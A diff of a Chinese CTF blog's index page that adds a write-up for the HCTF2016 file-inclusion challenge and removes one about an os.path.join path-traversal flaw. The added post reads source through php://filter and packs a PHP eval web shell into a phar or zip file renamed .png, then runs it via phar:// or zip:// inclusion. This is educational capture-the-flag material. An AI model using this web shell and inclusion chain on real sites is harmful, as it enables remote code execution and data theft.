@@ -131,6 +131,55 @@
 						<div class="row">
 							<div class="col-md-8">
 								<h3 class="title">
+									<a href="/2023/08/16/HCTF2016-兵者多诡-wp/" >HCTF2016-兵者多诡-wp</a>
+								</h3>
+							</div>
+							<div class="col-md-4">
+								<div class="date">post @ 2023-08-16
+								</div>
+							</div>
+						</div>
+						
+								
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="https://github.com/Heart-Sky/HCTF2016-LFI">相关资源</a></p>
+<p>首先进入的是<code>home.php</code>界面，可以上传文件，但不论上传什么只要<code>Content-Type</code>是<code>image/png</code>类型的都会被存储为<code>uploads/&#123;random&#125;.png</code></p>
+<p>而且可以注意到点击上传后url为：<code>http://localhost/home.php?fp=upload</code></p>
+<p>点击查看后url为<code>http://localhost/home.php?fp=show&amp;imagekey=&#123;random&#125;</code></p>
+<p>推测<code>fp</code>是一个文件前缀，拼接上<code>.php</code>后缀后通过文件包含来实现功能</p>
+<p>由此  我们可以通过伪协议<code>php://filter/convert.base64-encode/resource=xxx</code>来读取文件内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?fp=php:<span class="comment">//filter/convert.base64-encode/resource=home	# 注意没有.php因为会自动拼接</span></span><br><span class="line">?fp=php:<span class="comment">//filter/convert.base64-encode/resource=show</span></span><br><span class="line">?fp=php:<span class="comment">//filter/convert.base64-encode/resource=upload</span></span><br></pre></td></tr></table></figure>
+
+<p>再将得到的base64进行解码即可得到各文件源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// home.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$fp</span> = <span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fp&#x27;</span>]) ? <span class="string">&#x27;fail&#x27;</span> : <span class="variable">$_GET</span>[<span class="string">&#x27;fp&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.\./&#x27;</span>,<span class="variable">$fp</span>))&#123;	<span class="comment"># 不可文件夹穿越</span></span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;No No No!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/rm/i&#x27;</span>,<span class="variable">$_SERVER</span>[<span class="string">&quot;QUERY_STRING&quot;</span>]))&#123;</span><br><span class="line">	<span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$fp</span> !== <span class="string">&#x27;fail&#x27;</span>)&#123;</span><br><span class="line">	<span class="keyword">if</span>(!(<span class="keyword">include</span>(<span class="variable">$fp</span>.<span class="string">&#x27;.php&#x27;</span>)))&#123;		<span class="comment"># 拼接并文件包含</span></span><br><span class="line">		<span class="meta">?&gt;</span></span><br><span class="line">		&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">alert</span> <span class="title">alert</span>-<span class="title">danger</span>&quot; <span class="title">role</span>=&quot;<span class="title">alert</span>&quot;&gt;æ²¡ææ­¤é¡µé¢&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">			<span class="title">exit</span>;</span></span><br><span class="line"><span class="class">	&#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// upload.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;function.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">	<span class="variable">$type</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">	<span class="variable">$size</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">is_uploaded_file</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">		<span class="meta">?&gt;</span></span><br><span class="line">				&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">alert</span> <span class="title">alert</span>-<span class="title">danger</span>&quot; <span class="title">role</span>=&quot;<span class="title">alert</span>&quot;&gt;å¾çä¸ä¼ å¤±è´¥,è¯·éæ°ä¸ä¼ &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">				&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">					<span class="title">exit</span>;</span></span><br><span class="line"><span class="class">	&#125;</span></span><br><span class="line"><span class="class">	<span class="title">if</span>($<span class="title">type</span> !== &#x27;<span class="title">image</span>/<span class="title">png</span>&#x27;) </span>&#123;		<span class="comment"># Content-Type 必须为png</span></span><br><span class="line">		<span class="meta">?&gt;</span></span><br><span class="line">				&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">alert</span> <span class="title">alert</span>-<span class="title">danger</span>&quot; <span class="title">role</span>=&quot;<span class="title">alert</span>&quot;&gt;åªè½ä¸ä¼ <span class="title">PNG</span>å¾ç&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">				&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">					<span class="title">exit</span>;</span></span><br><span class="line"><span class="class">	&#125;</span></span><br><span class="line"><span class="class">	<span class="title">if</span>($<span class="title">size</span> &gt; 10240) </span>&#123;</span><br><span class="line">		<span class="meta">?&gt;</span></span><br><span class="line">				&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">alert</span> <span class="title">alert</span>-<span class="title">danger</span>&quot; <span class="title">role</span>=&quot;<span class="title">alert</span>&quot;&gt;å¾çå¤§å°è¶è¿10<span class="title">KB</span>&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">				&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">					<span class="title">exit</span>;</span></span><br><span class="line"><span class="class">	&#125;</span></span><br><span class="line"><span class="class">	$<span class="title">imagekey</span> = <span class="title">create_imagekey</span>();</span></span><br><span class="line"><span class="class">	<span class="title">move_uploaded_file</span>($<span class="title">name</span>,&quot;<span class="title">uploads</span>/$<span class="title">imagekey</span>.<span class="title">png</span>&quot;);	# 移动至新文件名</span></span><br><span class="line"><span class="class">	<span class="title">echo</span> &quot;&lt;<span class="title">script</span>&gt;<span class="title">location</span>.<span class="title">href</span>=&#x27;?<span class="title">fp</span>=<span class="title">show</span>&amp;<span class="title">imagekey</span>=$<span class="title">imagekey</span>&#x27;&lt;/<span class="title">script</span>&gt;&quot;;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>那么我们可以通过<code>phar</code>或<code>zip</code>生成带<code>1.php</code>（木马文件）的压缩包，改名为xx.png直接上传，然后再通过伪协议访问1.php</p>
+<h3 id="phar"><a href="#phar" class="headerlink" title="phar"></a>phar</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// phar.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">   <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">   <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot; __HALT_COMPILER(); &quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"></span><br><span class="line">   <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">   <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;1.php&quot;</span>, <span class="string">&quot;&lt;?php @eval(\$_POST[&#x27;cmd&#x27;]);?&gt;&quot;</span>);</span><br><span class="line">   <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// php phar.php; mv phar.phar phar.png;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?fp=phar:<span class="comment">//uploads/b732b00259385c9a996d4559011ed4f24584003a.png/1	// phar协议会自动解压压缩包内的文件内容，即访问1.php</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip 1.zip 1.php</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?fp=zip:<span class="comment">//uploads/61afff8789a2e5ac440dfd94c05455fa6dcdd142.png#1	//注意zip协议通过&#x27;#&#x27;来解压获取压缩包内文件</span></span><br></pre></td></tr></table></figure>
+
+
+	
+	</div>
+  <a type="button" href="/2023/08/16/HCTF2016-兵者多诡-wp/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+					
+						<!-- display as entry -->
+						<div class="row">
+							<div class="col-md-8">
+								<h3 class="title">
 									<a href="/2023/08/15/dcquals16-feedme/" >nightmare 2.11.defcon quals2016 feedme-wp</a>
 								</h3>
 							</div>
@@ -943,52 +992,6 @@
 </div>
 
 		
-			
-					
-						<!-- display as entry -->
-						<div class="row">
-							<div class="col-md-8">
-								<h3 class="title">
-									<a href="/2023/07/17/NISACTF2022-babyupload-wp/" >NISACTF2022-babyupload-wp</a>
-								</h3>
-							</div>
-							<div class="col-md-4">
-								<div class="date">post @ 2023-07-17
-								</div>
-							</div>
-						</div>
-						
-								
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2025">题目链接</a></p>
-<h2 id="查看源码"><a href="#查看源码" class="headerlink" title="查看源码"></a>查看源码</h2><p>发现 <code>&lt;!-- /source --&gt;</code></p>
-<p>访问下载得到python源代码</p>
-<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, redirect, g, send_from_directory</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">SCHEMA = <span class="string">&quot;&quot;&quot;CREATE TABLE files (</span></span><br><span class="line"><span class="string">id text primary key,</span></span><br><span class="line"><span class="string">path text</span></span><br><span class="line"><span class="string">);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db</span>():</span><br><span class="line">    g_db = <span class="built_in">getattr</span>(g, <span class="string">&#x27;_database&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> g_db <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        g_db = g._database = sqlite3.connect(<span class="string">&quot;database.db&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> g_db</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_first_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setup</span>():</span><br><span class="line">    os.remove(<span class="string">&quot;database.db&quot;</span>)</span><br><span class="line">    cur = db().cursor()</span><br><span class="line">    cur.executescript(SCHEMA)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;form action=&quot;/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">    Select image to upload:</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;submit&quot; value=&quot;Upload File&quot; name=&quot;submit&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;!-- /source --&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>():</span><br><span class="line">    <span class="keyword">return</span> send_from_directory(directory=<span class="string">&quot;/var/www/html/&quot;</span>, path=<span class="string">&quot;www.zip&quot;</span>, as_attachment=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;.&quot;</span> <span class="keyword">in</span> file.filename:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Bad filename!&quot;</span>, <span class="number">403</span></span><br><span class="line">    conn = db()</span><br><span class="line">    cur = conn.cursor()</span><br><span class="line">    uid = uuid.uuid4().<span class="built_in">hex</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cur.execute(<span class="string">&quot;insert into files (id, path) values (?, ?)&quot;</span>, (uid, file.filename,))</span><br><span class="line">    <span class="keyword">except</span> sqlite3.IntegrityError:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Duplicate file&quot;</span></span><br><span class="line">    conn.commit()</span><br><span class="line"></span><br><span class="line">    file.save(<span class="string">&#x27;uploads/&#x27;</span> + file.filename)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&#x27;/file/&#x27;</span> + uid)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/file/&lt;id&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    conn = db()</span><br><span class="line">    cur = conn.cursor()</span><br><span class="line">    cur.execute(<span class="string">&quot;select path from files where id=?&quot;</span>, (<span class="built_in">id</span>,))</span><br><span class="line">    res = cur.fetchone()</span><br><span class="line">    <span class="keyword">if</span> res <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;File not found&quot;</span>, <span class="number">404</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(res[0])</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(<span class="string">&quot;uploads/&quot;</span>, res[<span class="number">0</span>]), <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>
-
-<p>代码逻辑：</p>
-<ol>
-<li>上传的文件名如果包含 “.”，则报错</li>
-<li>上传成功的文件会存入<code>uploads</code> 文件夹中并生成一个uuid在<code>file</code>路径下</li>
-<li>访问<code>file/&lt;id&gt;</code> 时找到对应文件名，然后拼接成 <code>uploads/filename</code> ，读取文件内容</li>
-</ol>
-<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><code>os.path.join()</code> 函数存在<strong>绝对路径拼接漏洞</strong></p>
-<blockquote>
-<pre><code>os.path.join(path,*paths)函数用于将多个文件路径连接成一个组合的路径。第一个函数通常包含了基础路径，而之后的每个参数被当作组件拼接到基础路径之后。
-
-然而，这个函数有一个少有人知的特性，如果拼接的某个路径以 / 开头，那么包括基础路径在内的所有前缀路径都将被删除，该路径将视为绝对路径
-</code></pre>
-</blockquote>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>上传任意文件  然后抓包将文件名改为 “&#x2F;flag”，进行路径拼接时<code>uploads/</code>被删去，只剩下”&#x2F;flag”；跳转到 <code>&quot;/file/&lt;uuid&gt;&quot; </code> 即可查看flag</p>
-
-	
-	</div>
-  <a type="button" href="/2023/07/17/NISACTF2022-babyupload-wp/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -1050,7 +1053,7 @@
 		
 			<li><a href="/categories/web-learning/">web-learning<span>6</span></a></li>
 		
-			<li><a href="/categories/web-wp/">web-wp<span>50</span></a></li>
+			<li><a href="/categories/web-wp/">web-wp<span>51</span></a></li>
 		
 		</ul>
 	</div>
@@ -1061,48 +1064,48 @@
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
+			<li><a href="/tags/DASCTF2023/">DASCTF2023<span>1</span></a></li>
+		
+			<li><a href="/tags/IO-FILE/">IO_FILE<span>2</span></a></li>
+		
+			<li><a href="/tags/path-traversal/">path_traversal<span>1</span></a></li>
+		
+			<li><a href="/tags/got/">got<span>3</span></a></li>
+		
+			<li><a href="/tags/伪协议/">伪协议<span>3</span></a></li>
+		
+			<li><a href="/tags/Spring/">Spring<span>1</span></a></li>
+		
 			<li><a href="/tags/De1ctf2019/">De1ctf2019<span>1</span></a></li>
 		
-			<li><a href="/tags/sigsegv/">sigsegv<span>1</span></a></li>
+			<li><a href="/tags/php原生类/">php原生类<span>1</span></a></li>
 		
-			<li><a href="/tags/SWPUCTF2022/">SWPUCTF2022<span>3</span></a></li>
+			<li><a href="/tags/privilege-escalation/">privilege escalation<span>1</span></a></li>
 		
-			<li><a href="/tags/GXYCTF2019/">GXYCTF2019<span>1</span></a></li>
+			<li><a href="/tags/SROP/">SROP<span>2</span></a></li>
 		
-			<li><a href="/tags/off-by-one/">off_by_one<span>1</span></a></li>
+			<li><a href="/tags/CTF/">CTF<span>90</span></a></li>
 		
-			<li><a href="/tags/scxml/">scxml<span>1</span></a></li>
+			<li><a href="/tags/GKCTF2021/">GKCTF2021<span>1</span></a></li>
 		
-			<li><a href="/tags/赣网杯2021/">赣网杯2021<span>1</span></a></li>
+			<li><a href="/tags/SwampCTF2019/">SwampCTF2019<span>1</span></a></li>
 		
-			<li><a href="/tags/网鼎杯2018/">网鼎杯2018<span>1</span></a></li>
-		
-			<li><a href="/tags/reverse-shell/">reverse shell<span>1</span></a></li>
-		
-			<li><a href="/tags/BKP2016/">BKP2016<span>1</span></a></li>
-		
-			<li><a href="/tags/yaml反序列化/">yaml反序列化<span>1</span></a></li>
-		
-			<li><a href="/tags/canary/">canary<span>3</span></a></li>
-		
-			<li><a href="/tags/afr/">afr<span>2</span></a></li>
-		
-			<li><a href="/tags/unserialize/">unserialize<span>12</span></a></li>
-		
-			<li><a href="/tags/libc/">libc<span>1</span></a></li>
-		
-			<li><a href="/tags/HDCTF2023/">HDCTF2023<span>5</span></a></li>
-		
-			<li><a href="/tags/无字母rce/">无字母rce<span>3</span></a></li>
+			<li><a href="/tags/file-include/">file_include<span>5</span></a></li>
 		
 			<li><a href="/tags/upload/">upload<span>4</span></a></li>
 		
-			<li><a href="/tags/pwn/">pwn<span>27</span></a></li>
+			<li><a href="/tags/jwt/">jwt<span>1</span></a></li>
 		
-			<li><a href="/tags/thread/">thread<span>1</span></a></li>
+			<li><a href="/tags/dcquals2016/">dcquals2016<span>1</span></a></li>
+		
+			<li><a href="/tags/libc/">libc<span>1</span></a></li>
+		
+			<li><a href="/tags/NISACTF2022/">NISACTF2022<span>8</span></a></li>
+		
+			<li><a href="/tags/网鼎杯2018/">网鼎杯2018<span>1</span></a></li>
 		
 		
-		   <li><a href="/tags">...<span>114</span></a></li>
+		   <li><a href="/tags">...<span>118</span></a></li>
 		 
 		</ul>
 	</div>
@@ -1113,6 +1116,10 @@
 <div class="widget">
   <h4>Recent Posts</h4>
   <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2023/12/20/HGAME2023-Designer-wp/" ><i class="fa fa-file-o"></i>HGAME2023-Designer-wp</a>
+      </li>
     
       <li>
         <a href="/2023/12/13/JAVA反序列化CC3/" ><i class="fa fa-file-o"></i>JAVA反序列化CC3</a>
@@ -1128,10 +1135,6 @@
     
       <li>
         <a href="/2023/11/24/xxe/" ><i class="fa fa-file-o"></i>xxe</a>
-      </li>
-    
-      <li>
-        <a href="/2023/11/20/CVE-2018-1259复现/" ><i class="fa fa-file-o"></i>CVE-2018-1259复现</a>
       </li>
     
   </ul>
